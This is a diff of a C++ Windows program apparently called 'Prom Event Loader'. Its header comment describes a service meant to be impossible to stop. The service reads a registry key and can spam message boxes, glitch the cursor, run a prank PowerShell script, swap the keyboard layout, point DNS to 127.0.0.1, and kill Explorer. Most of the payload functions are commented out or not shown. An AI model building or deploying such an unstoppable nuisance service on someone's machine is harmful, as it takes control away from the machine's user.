@@ -1,17 +1,44 @@
 // tester.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 
+// Prom Event Loader.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+// Author : Jon Bauer (@JonBauer123)
+// Description : This is the a Service that cannot be stopped or paused once started. It reads a registery
+//				 key and determines which function. These functions include running powershell scripts,
+//				 signning the user out, or messing with the cursor.
+//
+// Dependences : -Knowledge of where the scripts will be before hand.
+//				 -Two cursor files placed with the other ones, named what is documented above the 
+//				  glitchCursor function.
+
+/*
+	Current Registry Value to Control Flow : Computer\HKEY_CURRENT_USER\AppEvents\testvalue (DWORD)
+
+	0x0000000 : The default waiting value
+	0x0000001 : Message "Welcome to Prom!!!" as title and "Are you ready for a long day?" as message 100x.
+	0x0000002 : Glitch the Cursor
+	0x0000003 : Return Cursor to default Cursor
+	0x0000004 : Runs the RickBomb.ps1 script
+	0x0000005 : Runs the script to change keyboard to dvorak
+	0x0000006 : Runs the script to change keyboard to qwert
+	0x0000007 : Runs the script to change Primary DNS server to 127.0.0.1 and flushes DNS cache
+	0x0000008 : -
+	0x0000009 : -
+	0x0000010 : -
+
+*/
+
 #include "pch.h"
 #include <iostream>
 #include <Windows.h>
 #include <string>
-#include <io.h>
 #include <process.h>
 #include <TlHelp32.h>
 
 using namespace std;
 
-#define NUM_BOXES 10
+//#define NUM_BOXES 10
 
 typedef DWORD(WINAPI* PtrWinStationSendMessage)(HANDLE, ULONG, LPCWSTR, ULONG, LPCWSTR, ULONG, ULONG, ULONG, PULONG, BOOLEAN);
 
@@ -55,7 +82,7 @@ void messageSpam(LPCWSTR title, LPCWSTR text) {
 
 	cout << "\tPrinted them all out.\n";
 }
-
+/*
 void callScript(string path) {
 
 	if (_access(path.c_str(), 0) == 0) {
@@ -386,7 +413,7 @@ void killExplorer() {
 	cout << "\tExplorer killed.\n";
 
 }
-
+*/
 int main()
 {
 	ShowWindow(::GetConsoleWindow(), SW_SHOW);
@@ -395,7 +422,7 @@ int main()
 
 	//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\RickBomb.ps1");
 
-	messageSpam(L"Welcome to Prom!!!", L"Are you ready? We are.");
+	//messageSpam(L"Welcome to Prom!!!", L"Are you ready? We are.");
 
 	//glitchCursor();
 	//defaultCursor();
